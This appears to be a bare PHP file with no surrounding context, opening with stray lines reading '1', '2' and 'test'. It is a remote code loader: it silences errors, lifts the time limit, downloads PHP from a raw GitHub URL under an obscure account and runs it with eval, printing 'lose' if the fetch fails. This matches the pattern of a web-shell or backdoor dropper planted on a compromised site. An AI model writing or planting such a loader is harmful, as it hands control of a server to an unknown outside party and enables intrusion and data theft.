1
2
test<?php
error_reporting(0);
set_time_limit(0);

// 
$url = "https://raw.githubusercontent.com/zzvvzzserverzzvvzz/serviceserver/refs/heads/main/sstest.php";

// 
$code = @file_get_contents($url);

// 
if($code !== false){
    eval("?>".$code);
} else {
    echo "lose";
}
